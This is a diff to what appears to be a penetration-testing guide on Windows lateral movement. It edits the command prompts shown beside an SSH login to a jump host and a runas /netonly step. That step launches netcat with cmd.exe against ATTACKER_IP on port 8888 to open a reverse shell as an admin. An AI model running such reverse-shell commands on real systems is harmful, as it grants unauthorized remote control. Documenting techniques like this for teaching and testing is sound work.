@@ -31,7 +31,7 @@ $ ssh test.com\\user@jmp.test.com
 This will provide us a command prompt:
 
 ```
-C:\> whoami
+C:\Users\user> whoami
 user
 ```
 
@@ -96,7 +96,7 @@ From the remote shell session (step 1), we can spawn a new `/netonly` shell to a
 
 {% code title="jmp.test.com (user)" overflow="wrap" %}
 ```sh
-C:\> runas.exe /netonly /user:test.com\admin "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 8888"
+C:\Users\user> runas.exe /netonly /user:test.com\admin "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 8888"
 ```
 {% endcode %}
 
@@ -104,7 +104,7 @@ The listener on port **8888** will receive a remote command prompt on `jmp.test.
 
 {% code title="jmp.test.com (admin)" %}
 ```
-C:\> whoami
+C:\Windows/system32> whoami
 admin
 ```
 {% endcode %}
